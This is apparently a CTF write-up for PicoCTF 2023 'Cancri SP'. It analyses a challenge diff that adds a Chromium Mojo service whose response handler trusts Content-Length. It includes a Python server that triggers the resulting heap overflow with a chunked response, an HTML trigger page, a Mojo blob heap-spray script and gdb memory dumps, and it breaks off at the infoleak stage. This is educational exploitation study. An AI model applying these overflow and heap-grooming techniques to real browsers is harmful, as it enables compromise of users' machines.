@@ -1,0 +1,856 @@
+export const title = "PicoCTF 2023: Cancri SP";
+
+Originally I looked at this challenge 2 years ago in PicoCTF 2023, but didn't manage to solve it in time. I was able to find the heap overflow vulnerability during the competition, but the rest of the challenge was too daunting for me to approach so I decided not to work on it. 2 years later I came back to look at the challenge again. The motivating factor for me was that nobody had posted a public writeup about the intended solution and I wanted to explore chromium exploitation.
+
+## challenge exploration
+
+The provided diff is quite large and implements quite a few new features. The full diff is available below for reference.
+
+```diff filename="diff (collapsed)"
+diff --git a/content/browser/BUILD.gn b/content/browser/BUILD.gn
+index 258a8b0ff4f73..898712edb9151 100644
+--- a/content/browser/BUILD.gn
++++ b/content/browser/BUILD.gn
+@@ -1381,6 +1381,8 @@ source_set("browser") {
+     "origin_trials/critical_origin_trials_throttle.h",
+     "origin_trials/origin_trials_utils.cc",
+     "origin_trials/origin_trials_utils.h",
++    "otter/otter_broker_service_impl.cc",
++    "otter/otter_broker_service_impl.h",
+     "payments/installed_payment_apps_finder_impl.cc",
+     "payments/installed_payment_apps_finder_impl.h",
+     "payments/payment_app_context_impl.cc",
+diff --git a/content/browser/browser_interface_binders.cc b/content/browser/browser_interface_binders.cc
+index d76825db14850..5ec6d9fb74b50 100644
+--- a/content/browser/browser_interface_binders.cc
++++ b/content/browser/browser_interface_binders.cc
+@@ -774,6 +774,9 @@ void PopulateFrameBinders(RenderFrameHostImpl* host, mojo::BinderMap* map) {
+   map->Add<blink::mojom::NotificationService>(base::BindRepeating(
+       &RenderFrameHostImpl::CreateNotificationService, base::Unretained(host)));
+
++  map->Add<blink::mojom::OtterBrokerService>(base::BindRepeating(
++      &RenderFrameHostImpl::CreateOtterBrokerService, base::Unretained(host)));
++
+   map->Add<network::mojom::P2PSocketManager>(
+       base::BindRepeating(&BindSocketManager, base::Unretained(host)));
+
+diff --git a/content/browser/otter/otter_broker_service_impl.cc b/content/browser/otter/otter_broker_service_impl.cc
+index e69de29bb2d1d..cc6b767bec6e9 100644
+--- a/content/browser/otter/otter_broker_service_impl.cc
++++ b/content/browser/otter/otter_broker_service_impl.cc
+@@ -0,0 +1,168 @@
++#include "content/browser/otter/otter_broker_service_impl.h"
++
++#include "content/browser/renderer_host/render_frame_host_impl.h"
++#include "content/browser/url_loader_factory_params_helper.h"
++#include "services/network/public/mojom/url_loader_factory.mojom.h"
++
++#include <iostream>
++
++namespace content {
++
++constexpr net::NetworkTrafficAnnotationTag kTrafficAnnotation =
++net::DefineNetworkTrafficAnnotation("otter_notif", "OTTER");
++
++OtterBrokerServiceImpl::OtterBrokerServiceImpl(base::WeakPtr<RenderFrameHostImpl> frame_ptr): frame_{std::move(frame_ptr)} {
++    auto* frame = frame_.get();
++    auto params = URLLoaderFactoryParamsHelper::CreateForFrame(
++        frame, frame->GetLastCommittedOrigin(),
++        frame->GetIsolationInfoForSubresources(),
++        frame->BuildClientSecurityState(),
++        /**coep_reporter=*/mojo::NullRemote(), frame->GetProcess(),
++        network::mojom::TrustTokenRedemptionPolicy::kForbid,
++        frame->GetCookieSettingOverrides(), "OtterBrokerServiceImpl");
++
++    params->is_corb_enabled = false;
++
++    frame_->GetProcess()->CreateURLLoaderFactory(
++        url_loader_factory_.BindNewPipeAndPassReceiver(),
++        std::move(params)
++    );
++}
++
++OtterBrokerServiceImpl::~OtterBrokerServiceImpl() = default;
++
++void OtterBrokerServiceImpl::QueryRpc(const std::string& method, RpcCallback cb) {
++    mojo::Remote<network::mojom::URLLoader> url_loader;
++    mojo::PendingRemote<network::mojom::URLLoaderClient> url_loader_client;
++    network::ResourceRequest resource_request;
++    mojo::PendingReceiver<network::mojom::URLLoader> url_loader_receiver;
++    GURL::Replacements replacements;
++
++    url_loader_receiver = url_loader.BindNewPipeAndPassReceiver(),
++
++    replacements.SetHostStr(host_);
++    resource_request.url = GURL("http://osec.io/").ReplaceComponents(replacements);
++
++    resource_request.method = net::HttpRequestHeaders::kPostMethod;
++    resource_request.request_initiator = frame_->GetLastCommittedOrigin();
++    resource_request.headers.SetHeader("accept-language", "en-US");
++    resource_request.headers.SetHeader("content-type", "application/json");
++    resource_request.headers.SetHeader("user-agent", "OtterBroker");
++
++    char data[0x80];
++    size_t data_len = std::snprintf(data, sizeof(data), "{\"id\":0,\"jsonrpc\":\"2.0\",\"method\":\"%s\",\"params\":null}", method.c_str());
++    CHECK(data_len < sizeof(data));
++
++    resource_request.request_body = new network::ResourceRequestBody();
++    resource_request.request_body->AppendBytes(data, data_len);
++
++    mojo::MakeSelfOwnedReceiver(
++        std::make_unique<RequestHandlerImpl>(std::move(url_loader), std::move(cb)),
++        url_loader_client.InitWithNewPipeAndPassReceiver()
++    );
++
++    url_loader_factory_->CreateLoaderAndStart(
++        std::move(url_loader_receiver),
++        0,
++        network::mojom::kURLLoadOptionBlockAllCookies,
++        std::move(resource_request),
++        std::move(url_loader_client),
++        net::MutableNetworkTrafficAnnotationTag(kTrafficAnnotation)
++    );
++
++}
++
++void AfterGetSlot(OtterBrokerServiceImpl::GetSlotCallback callback, const std::vector<uint8_t> data) {
++  if (data.size() == 0) {
++    std::move(callback).Run(0);
++  } else {
++    std::move(callback).Run(atoi((char*) data.data()));
++  }
++}
++
++void OtterBrokerServiceImpl::GetSlot(GetSlotCallback callback) {
++  if (!inited_) {
++    mojo::ReportBadMessage("OtterBrokerServiceImpl: Init not yet invoked");
++    std::move(callback).Run(0);
++    return;
++  }
++
++  QueryRpc("getSlot", base::BindOnce(&AfterGetSlot, std::move(callback)));
++}
++
++void OtterBrokerServiceImpl::Init(const std::string& host, InitCallback callback) {
++  if (inited_) {
++    mojo::ReportBadMessage("OtterBrokerServiceImpl: Init already invoked");
++    std::move(callback).Run();
++    return;
++  }
++
++  inited_ = true;
++  host_ = host;
++
++  std::move(callback).Run();
++}
++
++RequestHandlerImpl::RequestHandlerImpl(mojo::Remote<network::mojom::URLLoader> url_loader, OtterBrokerServiceImpl::RpcCallback callback): url_loader_{std::move(url_loader)}, callback_{std::move(callback)} {
++}
++
++RequestHandlerImpl::~RequestHandlerImpl() {
++    if (callback_) {
++        std::move(callback_).Run(std::vector<uint8_t>());
++    }
++}
++
++void RequestHandlerImpl::OnReceiveEarlyHints(network::mojom::EarlyHintsPtr early_hints) {
++}
++
++void RequestHandlerImpl::OnReceiveResponse(
++    network::mojom::URLResponseHeadPtr head,
++    mojo::ScopedDataPipeConsumerHandle body,
++    absl::optional<mojo_base::BigBuffer> cached_metadata) {
++
++    int64_t content_len = head->headers->GetContentLength();
++
++    if (content_len < 0) return;
++
++    auto data = std::make_unique<uint8_t[]>(content_len);
++    uint8_t* ptr = data.get();
++
++    uint32_t num_bytes;
++    MojoResult result;
++    while ((result = body->ReadData(ptr, &num_bytes, MOJO_READ_DATA_FLAG_NONE)) != MOJO_RESULT_FAILED_PRECONDITION) {
++        if (result == MOJO_RESULT_OK) {
++            ptr += num_bytes;
++            num_bytes = content_len;
++        }
++    }
++
++    char start[] = "{\"jsonrpc\":\"2.0\",\"result\":";
++    char end[] = ",\"id\":0}";
++
++    size_t amt_read = (size_t) (ptr - data.get());
++    if (amt_read <= sizeof(start) + sizeof(end)) {
++      std::move(callback_).Run(std::vector<uint8_t>());
++    } else {
++      std::move(callback_).Run(std::vector<uint8_t>(data.get() + sizeof(start), ptr - sizeof(end)));
++    }
++}
++
++void RequestHandlerImpl::OnReceiveRedirect(const net::RedirectInfo& redirect_info,
++network::mojom::URLResponseHeadPtr head) {
++    url_loader_->FollowRedirect({}, {}, {}, absl::nullopt);
++}
++
++void RequestHandlerImpl::OnUploadProgress(
++    int64_t current_position,
++    int64_t total_size,
++    network::mojom::URLLoaderClient::OnUploadProgressCallback callback) {
++        CHECK(false);
++}
++
++void RequestHandlerImpl::OnTransferSizeUpdated(int32_t transfer_size_diff) {
++}
++
++void RequestHandlerImpl::OnComplete(const network::URLLoaderCompletionStatus& status) {
++}
++
++}
+diff --git a/content/browser/otter/otter_broker_service_impl.h b/content/browser/otter/otter_broker_service_impl.h
+index e69de29bb2d1d..cbc6371b64236 100644
+--- a/content/browser/otter/otter_broker_service_impl.h
++++ b/content/browser/otter/otter_broker_service_impl.h
+@@ -0,0 +1,66 @@
++#ifndef CONTENT_BROWSER_OTTER_OTTER_BROKER_SERVICE_IMPL_H_
++#define CONTENT_BROWSER_OTTER_OTTER_BROKER_SERVICE_IMPL_H_
++
++#include "base/memory/weak_ptr.h"
++#include "mojo/public/cpp/bindings/remote.h"
++#include "third_party/blink/public/mojom/otter/otter_broker.mojom.h"
++#include "services/network/public/mojom/url_loader.mojom.h"
++#include "services/network/public/mojom/url_loader_factory.mojom.h"
++
++namespace content {
++
++class RenderFrameHostImpl;
++
++class OtterBrokerServiceImpl final
++    : public blink::mojom::OtterBrokerService {
++  public:
++    using RpcCallback = base::OnceCallback<void(std::vector<uint8_t>)>;
++
++    OtterBrokerServiceImpl(base::WeakPtr<RenderFrameHostImpl> frame);
++    ~OtterBrokerServiceImpl() override;
++
++    void Init(const std::string& host, InitCallback callback) override;
++    void GetSlot(GetSlotCallback callback) override;
++
++    void QueryRpc(const std::string& method, RpcCallback cb);
++
++  private:
++    bool inited_ = false;
++    std::string host_;
++    const base::WeakPtr<RenderFrameHostImpl> frame_;
++    mojo::Remote<network::mojom::URLLoaderFactory> url_loader_factory_;
++};
++
++class RequestHandlerImpl: public network::mojom::URLLoaderClient {
++ public:
++  RequestHandlerImpl(mojo::Remote<network::mojom::URLLoader> url_loader, OtterBrokerServiceImpl::RpcCallback callback);
++  ~RequestHandlerImpl() override;
++
++  void OnReceiveEarlyHints(network::mojom::EarlyHintsPtr early_hints) override;
++
++  void OnReceiveResponse(
++      network::mojom::URLResponseHeadPtr head,
++      mojo::ScopedDataPipeConsumerHandle body,
++      absl::optional<mojo_base::BigBuffer> cached_metadata) override;
++
++  void OnReceiveRedirect(const net::RedirectInfo& redirect_info,
++    network::mojom::URLResponseHeadPtr head) override;
++
++  void OnUploadProgress(
++    int64_t current_position,
++    int64_t total_size,
++    network::mojom::URLLoaderClient::OnUploadProgressCallback callback) override;
++
++  void OnTransferSizeUpdated(int32_t transfer_size_diff) override;
++
++  void OnComplete(const network::URLLoaderCompletionStatus& status) override;
++
++
++  private:
++    mojo::Remote<network::mojom::URLLoader> url_loader_;
++    OtterBrokerServiceImpl::RpcCallback callback_;
++};
++
++}
++
++#endif
+diff --git a/content/browser/renderer_host/render_frame_host_impl.cc b/content/browser/renderer_host/render_frame_host_impl.cc
+index 6255ee6071bfd..c092914a0d9da 100644
+--- a/content/browser/renderer_host/render_frame_host_impl.cc
++++ b/content/browser/renderer_host/render_frame_host_impl.cc
+@@ -10828,6 +10828,13 @@ void RenderFrameHostImpl::CreateNotificationService(
+       storage_key(), std::move(receiver));
+ }
+
++void RenderFrameHostImpl::CreateOtterBrokerService(
++    mojo::PendingReceiver<blink::mojom::OtterBrokerService> receiver) {
++  mojo::MakeSelfOwnedReceiver(
++      std::make_unique<OtterBrokerServiceImpl>(weak_ptr_factory_.GetWeakPtr()),
++      std::move(receiver));
++}
++
+ void RenderFrameHostImpl::CreateInstalledAppProvider(
+     mojo::PendingReceiver<blink::mojom::InstalledAppProvider> receiver) {
+   InstalledAppProviderImpl::Create(*this, std::move(receiver));
+diff --git a/content/browser/renderer_host/render_frame_host_impl.h b/content/browser/renderer_host/render_frame_host_impl.h
+index 14e281b743ac6..4cfaeb825059a 100644
+--- a/content/browser/renderer_host/render_frame_host_impl.h
++++ b/content/browser/renderer_host/render_frame_host_impl.h
+@@ -46,6 +46,7 @@
+ #include "content/browser/buckets/bucket_context.h"
+ #include "content/browser/can_commit_status.h"
+ #include "content/browser/network/cross_origin_opener_policy_reporter.h"
++#include "content/browser/otter/otter_broker_service_impl.h"
+ #include "content/browser/renderer_host/back_forward_cache_impl.h"
+ #include "content/browser/renderer_host/back_forward_cache_metrics.h"
+ #include "content/browser/renderer_host/browsing_context_state.h"
+@@ -1921,6 +1922,9 @@ class CONTENT_EXPORT RenderFrameHostImpl
+   void CreateNotificationService(
+       mojo::PendingReceiver<blink::mojom::NotificationService> receiver);
+
++  void CreateOtterBrokerService(
++      mojo::PendingReceiver<blink::mojom::OtterBrokerService> receiver);
++
+   void CreateInstalledAppProvider(
+       mojo::PendingReceiver<blink::mojom::InstalledAppProvider> receiver);
+
+diff --git a/third_party/blink/public/mojom/BUILD.gn b/third_party/blink/public/mojom/BUILD.gn
+index 036aede8f75a8..ee191563ae057 100644
+--- a/third_party/blink/public/mojom/BUILD.gn
++++ b/third_party/blink/public/mojom/BUILD.gn
+@@ -144,6 +144,7 @@ mojom("mojom_platform") {
+     "notifications/notification_service.mojom",
+     "oom_intervention/oom_intervention.mojom",
+     "opengraph/metadata.mojom",
++    "otter/otter_broker.mojom",
+     "parakeet/ad_request.mojom",
+     "payments/payment_app.mojom",
+     "peerconnection/peer_connection_tracker.mojom",
+diff --git a/third_party/blink/public/mojom/otter/otter_broker.mojom b/third_party/blink/public/mojom/otter/otter_broker.mojom
+index e69de29bb2d1d..c54e7ad7e7587 100644
+--- a/third_party/blink/public/mojom/otter/otter_broker.mojom
++++ b/third_party/blink/public/mojom/otter/otter_broker.mojom
+@@ -0,0 +1,6 @@
++module blink.mojom;
++
++interface OtterBrokerService {
++  Init(string host) => ();
++  GetSlot() => (uint64 slot);
++};
+```
+
+The diff adds a OtterBroker mojom service that will send a POST request to a user specified server and parses the response with a custom response handler. Mojo is an IPC system for communicating between the renderer process and the browser process.
+
+More in-depth reading about mojo:
+
+- [https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md](https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md)
+- [https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/README.md#Mojo-Services](https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/README.md#Mojo-Services)
+
+```cpp open
+void OtterBrokerServiceImpl::QueryRpc(const std::string& method, RpcCallback cb) {
+    mojo::Remote<network::mojom::URLLoader> url_loader;
+    mojo::PendingRemote<network::mojom::URLLoaderClient> url_loader_client;
+    network::ResourceRequest resource_request;
+    mojo::PendingReceiver<network::mojom::URLLoader> url_loader_receiver;
+    GURL::Replacements replacements;
+
+    url_loader_receiver = url_loader.BindNewPipeAndPassReceiver(),
+
+    replacements.SetHostStr(host_);
+    resource_request.url = GURL("http://osec.io/").ReplaceComponents(replacements);
+
+    resource_request.method = net::HttpRequestHeaders::kPostMethod;
+    resource_request.request_initiator = frame_->GetLastCommittedOrigin();
+    resource_request.headers.SetHeader("accept-language", "en-US");
+    resource_request.headers.SetHeader("content-type", "application/json");
+    resource_request.headers.SetHeader("user-agent", "OtterBroker");
+
+    char data[0x80];
+    size_t data_len = std::snprintf(data, sizeof(data), "{\"id\":0,\"jsonrpc\":\"2.0\",\"method\":\"%s\",\"params\":null}", method.c_str());
+    CHECK(data_len < sizeof(data));
+
+    resource_request.request_body = new network::ResourceRequestBody();
+    resource_request.request_body->AppendBytes(data, data_len);
+
+    mojo::MakeSelfOwnedReceiver(
+        std::make_unique<RequestHandlerImpl>(std::move(url_loader), std::move(cb)),
+        url_loader_client.InitWithNewPipeAndPassReceiver()
+    );
+
+    url_loader_factory_->CreateLoaderAndStart(
+        std::move(url_loader_receiver),
+        0,
+        network::mojom::kURLLoadOptionBlockAllCookies,
+        std::move(resource_request),
+        std::move(url_loader_client),
+        net::MutableNetworkTrafficAnnotationTag(kTrafficAnnotation)
+    );
+
+}
+
+void RequestHandlerImpl::OnReceiveResponse(
+    network::mojom::URLResponseHeadPtr head,
+    mojo::ScopedDataPipeConsumerHandle body,
+    absl::optional<mojo_base::BigBuffer> cached_metadata) {
+
+    int64_t content_len = head->headers->GetContentLength();
+
+    if (content_len < 0) return;
+
+    auto data = std::make_unique<uint8_t[]>(content_len);
+    uint8_t* ptr = data.get();
+
+    uint32_t num_bytes;
+    MojoResult result;
+    while ((result = body->ReadData(ptr, &num_bytes, MOJO_READ_DATA_FLAG_NONE)) != MOJO_RESULT_FAILED_PRECONDITION) {
+        if (result == MOJO_RESULT_OK) {
+            ptr += num_bytes;
+            num_bytes = content_len;
+        }
+    }
+
+    char start[] = "{\"jsonrpc\":\"2.0\",\"result\":";
+    char end[] = ",\"id\":0}";
+
+    size_t amt_read = (size_t) (ptr - data.get());
+    if (amt_read <= sizeof(start) + sizeof(end)) {
+      std::move(callback_).Run(std::vector<uint8_t>());
+    } else {
+      std::move(callback_).Run(std::vector<uint8_t>(data.get() + sizeof(start), ptr - sizeof(end)));
+    }
+}
+```
+
+These are the the public functions that are registered for the OtterBroker mojom service. `Init` allows the one time configuration of the target server to query and `GetSlot` performs the POST query to the target server.
+
+```js open
+interface OtterBrokerService {
+  Init(string host) => ();
+  GetSlot() => (uint64 slot);
+};
+```
+
+```cpp open
+void OtterBrokerServiceImpl::GetSlot(GetSlotCallback callback) {
+  if (!inited_) {
+    mojo::ReportBadMessage("OtterBrokerServiceImpl: Init not yet invoked");
+    std::move(callback).Run(0);
+    return;
+  }
+
+  QueryRpc("getSlot", base::BindOnce(&AfterGetSlot, std::move(callback)));
+}
+
+void OtterBrokerServiceImpl::Init(const std::string& host, InitCallback callback) {
+  if (inited_) {
+    mojo::ReportBadMessage("OtterBrokerServiceImpl: Init already invoked");
+    std::move(callback).Run();
+    return;
+  }
+
+  inited_ = true;
+  host_ = host;
+
+  std::move(callback).Run();
+}
+```
+
+Inside of the provided `template/public` folder we are given an index.html file that gives an example of how to communicate with the OtterBroker service:
+
+```html filename="index.html" open
+<script src="/mojojs/mojo_bindings.js"></script>
+<script src="/mojojs/gen/third_party/blink/public/mojom/otter/otter_broker.mojom.js"></script>
+
+<marquee id="txt"></marquee>
+<button onclick="updateSlot()">Update Slot!</button>
+
+<script>
+    const ptr = new blink.mojom.OtterBrokerServicePtr();
+    Mojo.bindInterface(
+        blink.mojom.OtterBrokerService.name,
+        mojo.makeRequest(ptr).handle
+    );
+
+    // This service is NOT in scope. This is merely meant to proxy
+    // Solana RPC transactions which unfortunately reject requests
+    // with a set Origin header.
+    //
+    // Please do NOT pwn this service. This is irrelevant to the
+    // challenge.
+    ptr.init("proxy.ottersec.workers.dev");
+
+    const updateSlot = async () => {
+        const { slot } = await ptr.getSlot();
+        txt.innerText = slot;
+    };
+</script>
+```
+
+## vulnerability
+
+Immediately one part of the response handling code stands out as suspicious:
+
+```cpp open
+    int64_t content_len = head->headers->GetContentLength();
+
+    if (content_len < 0) return;
+
+    auto data = std::make_unique<uint8_t[]>(content_len);
+    uint8_t* ptr = data.get();
+
+    uint32_t num_bytes;
+    MojoResult result;
+    while ((result = body->ReadData(ptr, &num_bytes, MOJO_READ_DATA_FLAG_NONE)) != MOJO_RESULT_FAILED_PRECONDITION) {
+        if (result == MOJO_RESULT_OK) {
+            ptr += num_bytes;
+            num_bytes = content_len;
+        }
+    }
+```
+
+The code reads the value of the `Content-Length` header, allocates a `uint8_t` array based on the content length, and then reads the request body into the array. This code is strange because there are many different ways to manipulate the actual size of a response body to be different from the `Content-Length` header.
+
+One example of this is the `Transfer-Encoding: chunked` header. Instead of sending the body of the response in one block it is chunked into individual blocks with each block specifying its own length. When receiving a response with `Transfer-Encoding: chunked` you are not supposed to trust the `Content-Length` header. But the OtterBroker response handler doesn't seem to check for this...
+
+We can test this out with a custom python server:
+
+```py filename="server.py" open
+from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer as HTTPServer
+
+class Handler(SimpleHTTPRequestHandler):
+    protocol_version = "HTTP/1.1"
+
+    def do_POST(self):
+        contentlen = int(self.headers.get("Content-Length"))
+        data = self.rfile.read(contentlen)
+
+        dummy_len = 0
+        payload = b"A" * 0x700
+
+        self.send_response(200)
+        self.send_header("Transfer-Encoding", "chunked")
+        self.send_header("Content-Length", str(dummy_len))
+        self.end_headers()
+
+        body: bytes = b""
+        body += f"{len(payload):x}\r\n".encode()
+        body += payload
+        body += b"\r\n"
+        body += b"0\r\n\r\n\r\n"
+
+        self.wfile.write(body)
+
+server = HTTPServer(("0.0.0.0", 80), Handler)
+server.serve_forever()
+```
+
+```html filename="index.html" open
+<script src="mojojs/mojo_bindings.js"></script>
+<script src="mojojs/gen/third_party/blink/public/mojom/otter/otter_broker.mojom.js"></script>
+
+<script>
+    const ptr = new blink.mojom.OtterBrokerServicePtr();
+    Mojo.bindInterface(
+        blink.mojom.OtterBrokerService.name,
+        mojo.makeRequest(ptr).handle
+    );
+
+    ptr.init("localhost");
+
+    (async () => {
+        await ptr.getSlot();
+    })();
+</script>
+```
+
+If we point OtterBroker to our local server and trigger a request, chrome will crash with an error message:
+
+```cpp open
+../../base/allocator/partition_allocator/partition_cookie.h(27) Check failed: *cookie_ptr == kCookieValue[i]
+```
+
+Inspecting the chromium source, the path that ends up checking this cookie value looks like this:
+
+_PartitionFree -> FreeInlineUnknownRoot -> FreeInline -> FreeNoHooksImmediate -> PartitionCookieCheckValue_
+
+FreeNoHooksImmediate ends up calling PartitionCookieCheckValue [here](https://source.chromium.org/chromium/chromium/src/+/main:base/allocator/partition_allocator/src/partition_alloc/partition_root.h;l=1612?q=FreeInlineInUnknownRoot&ss=chromium&start=1).
+
+![kcookie check](./.images/kcookie-check.png/raw)
+
+The kCookieValue is defined [here](https://source.chromium.org/chromium/chromium/src/+/main:base/allocator/partition_allocator/src/partition_alloc/partition_cookie.h;l=34?q=kCookie%20alloc&ss=chromium), and is surprisingly set to a static value. Normally cookie values are dynamically generated at runtime to prevent an attacker from being able to bypass the cookie check without leaking the value first. However here no leaks are required since we know the value of the cookie before hand.
+
+![kcookie](./.images/kcookie.png/raw)
+
+## BLOBS
+
+Prior to this, I knew that the solution would have something to do with mojo blobs. Mojo blobs are controlled bits of data that can be allocated through the mojo blob interface. They are also a perfect target for our overflow vulnerability since they are allocated on the same heap as our response buffer. I didn't know anything about what a blob looks like in memory, so I wrote a simple script that would let me find the blobs in memory easily to inspect.
+
+```html filename="index.html" open
+<script src="mojojs/mojo_bindings.js"></script>
+<script src="mojojs/gen/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+
+<script>
+    let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
+    Mojo.bindInterface(
+        blink.mojom.BlobRegistry.name,
+        mojo.makeRequest(blob_registry_ptr).handle,
+        "process"
+    );
+
+    let global_blobs = [];
+
+    async function getBlob(store, data) {
+        function Impl() {}
+        Impl.prototype = {
+            requestAsReply: async (a, b) => {
+                return {
+                    data: [1],
+                };
+            },
+            requestAsStream: () => log("hi2"),
+            requestAsFile: () => log("hi3"),
+        };
+
+        let bytes_provider = new mojo.Binding(
+            blink.mojom.BytesProvider,
+            new Impl()
+        );
+        let bytes_provider_ptr = new blink.mojom.BytesProviderPtr();
+        bytes_provider.bind(mojo.makeRequest(bytes_provider_ptr));
+
+        let blob_ptr = new blink.mojom.BlobPtr();
+        let blob_req = mojo.makeRequest(blob_ptr);
+
+        if (typeof data === "string") {
+            data = new TextEncoder().encode(data);
+            // console.log(data.constructor.name);
+        }
+
+        let data_element = new blink.mojom.DataElement();
+        data_element.bytes = new blink.mojom.DataElementBytes();
+        data_element.bytes.length = data.length;
+        data_element.bytes.embeddedData = data;
+        data_element.bytes.data = bytes_provider_ptr;
+
+        let r = await blob_registry_ptr.register(
+            blob_req,
+            Math.random().toString(),
+            "text/data",
+            "text/data",
+            [data_element]
+        );
+
+        store.push(blob_ptr);
+        return blob_ptr;
+    }
+
+    (async () => {
+        for (let i = 0; i < 1000; i++) {
+            await getBlob(global_blobs, "R".repeat(0x1000));
+        }
+        let data = "LES-AMATEURS";
+        data += "Z".repeat(0x1000 - data.length);
+        let blob1 = await getBlob(global_blobs, data);
+        let blob2 = await getBlob(global_blobs, data);
+
+        while (1) {}
+    })();
+</script>
+```
+
+Here we first allocate 1000 blobs to exhaust the allocator of free chunks that share the same size as our blob object. This forces the allocator to begin allocating new chunks from linear memory and guarantees that the new blobs with the `LES-AMATEURS` strings will be allocated next to each other. Then we can find the chunks in memory with gdb:
+
+```ansi open
+[22;1;32mgef> [22;39mfind LES-AMATEURS -d
+[22;1;34m[+][22;39m Searching '[33mLES-AMATEURS[39m' in whole memory
+[22;1;32m[+][22;39m In (0x3c7401984000-0x3c740199a000 [rw-])
+  0x3c7401993c00:    [38:2:255:255:255m4c[39m [38:2:255:255:255m45[39m [38:2:255:255:255m53[39m [38:2:255:255:255m2d[39m [38:2:255:255:255m41[39m [38:2:255:255:255m4d[39m [38:2:255:255:255m41[39m [38:2:255:255:255m54[39m  [38:2:255:255:255m45[39m [38:2:255:255:255m55[39m [38:2:255:255:255m52[39m [38:2:255:255:255m53[39m [38:2:255:255:255m5a[39m [38:2:255:255:255m5a[39m [38:2:255:255:255m5a[39m [38:2:255:255:255m5a[39m    |  LES-AMATEURSZZZZ  |
+  0x3c7401995000:    [38:2:255:255:255m4c[39m [38:2:255:255:255m45[39m [38:2:255:255:255m53[39m [38:2:255:255:255m2d[39m [38:2:255:255:255m41[39m [38:2:255:255:255m4d[39m [38:2:255:255:255m41[39m [38:2:255:255:255m54[39m  [38:2:255:255:255m45[39m [38:2:255:255:255m55[39m [38:2:255:255:255m52[39m [38:2:255:255:255m53[39m [38:2:255:255:255m5a[39m [38:2:255:255:255m5a[39m [38:2:255:255:255m5a[39m [38:2:255:255:255m5a[39m    |  LES-AMATEURSZZZZ  |[m
+```
+
+Then we issue find calls for each of the string pointers to locate the actual blob object:
+
+```ansi open
+[22;1;32mgef> [22;39mfind 0x3c7401993c00
+[22;1;34m[+][22;39m Searching '[33m\x00\x3c\x99\x01\x74\x3c[39m' in whole memory
+[22;1;32m[+][22;39m In (0x3c740193c000-0x3c7401947000 [rw-])
+  0x3c74019457e0:    [90m00[39m [38:2:255:255:255m3c[39m [33m99[39m [33m01[39m [38:2:255:255:255m74[39m [38:2:255:255:255m3c[39m [90m00[39m [90m00[39m  [90m00[39m [38:2:255:255:255m4c[39m [33m99[39m [33m01[39m [38:2:255:255:255m74[39m [38:2:255:255:255m3c[39m [90m00[39m [90m00[39m    |  .<..t<...L..t<..  |[m
+[22;1;32mgef> [22;39mfind 0x3c7401995000
+[22;1;34m[+][22;39m Searching '[33m\x00\x50\x99\x01\x74\x3c[39m' in whole memory
+[22;1;32m[+][22;39m In (0x3c740193c000-0x3c7401947000 [rw-])
+  0x3c7401945b60:    [90m00[39m [38:2:255:255:255m50[39m [33m99[39m [33m01[39m [38:2:255:255:255m74[39m [38:2:255:255:255m3c[39m [90m00[39m [90m00[39m  [90m00[39m [38:2:255:255:255m60[39m [33m99[39m [33m01[39m [38:2:255:255:255m74[39m [38:2:255:255:255m3c[39m [90m00[39m [90m00[39m    |  .P..t<...`..t<..  |[m
+```
+
+Since we know that heap allocated objects always have a heap cookie, to find the start of the blob we just need to search backwards until we see the cookie value.
+
+```ansi open
+[22;1;32mgef> [22;39mtele 0x3c74019457e0-0x80 20
+      [36m0x3c7401945760[39m|+0x0000|+000: 0x0000000000000000
+      [36m0x3c7401945768[39m|+0x0008|+001: 0xabababababababab
+      [36m0x3c7401945770[39m|+0x0010|+002: 0x0dd0fecaefbeadde  <- !! heap cookie !!
+      [36m0x3c7401945778[39m|+0x0018|+003: 0x1eab11ba05f03713  <- !! heap cookie !!
+      [36m0x3c7401945780[39m|+0x0020|+004: [38:2:255:255:255m0x00005c26b2ed2d70[39m <vtable for storage::BlobDataItem+0x10>  ->  [31m0x00005c26ac41f1a0[39m <storage::BlobDataItem::~BlobDataItem()>  ->  0x48535641e5894855
+      [36m0x3c7401945788[39m|+0x0028|+005: 0xabab000000000001
+      [36m0x3c7401945790[39m|+0x0030|+006: 0x0000000000000000
+      [36m0x3c7401945798[39m|+0x0038|+007: 0x0000000000000000
+      [36m0x3c74019457a0[39m|+0x0040|+008: 0x0000000000000000
+      [36m0x3c74019457a8[39m|+0x0048|+009: 0x0000000000000000
+      [36m0x3c74019457b0[39m|+0x0050|+010: 0x0000000000000000
+      [36m0x3c74019457b8[39m|+0x0058|+011: 0x0000000000000000
+      [36m0x3c74019457c0[39m|+0x0060|+012: 0x0000000000000000
+      [36m0x3c74019457c8[39m|+0x0068|+013: 0xabababab00000000
+      [36m0x3c74019457d0[39m|+0x0070|+014: 0x0000000000000000
+      [36m0x3c74019457d8[39m|+0x0078|+015: 0x0000000000001000
+      [36m0x3c74019457e0[39m|+0x0080|+016: [32m0x00003c7401993c00[39m  ->  0x54414d412d53454c [33m'LES-AMATEURSZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ[...]'
+[39m      [36m0x3c74019457e8[39m|+0x0088|+017: [32m0x00003c7401994c00[39m  ->  0xabababababababab
+      [36m0x3c74019457f0[39m|+0x0090|+018: [32m0x00003c7401994c00[39m  ->  0xabababababababab
+      [36m0x3c74019457f8[39m|+0x0098|+019: 0x0000000000000000[m
+```
+
+From this dump we can infer the offsets of some of the fields in the blob:
+
+offset `0x00` -> BlobDataItem vtable
+
+offset `0x08` -> refcount
+
+offset `0x58` -> length of the blob
+
+offset `0x60` -> pointer to data
+
+offset `0x68` -> pointer to end of data
+
+offset `0x70` -> pointer to end of data
+
+The other parts of the blob are zeroed so we can just ignore them for now. We also know that the two blobs that contain `LES-AMATEURS` are allocated next to each other, the difference between them is the size of the blob object on the heap.
+
+```ansi open
+[22;1;32mgef> [22;39mp 0x3c7401945b60-0x3c74019457e0
+[36m$1[39m = 0x380[m
+```
+
+So the size of a blob object on the heap is `0x370`, subtracting `0x10` to account for the heap cookie.
+
+## exploitation
+
+### infoleak
+
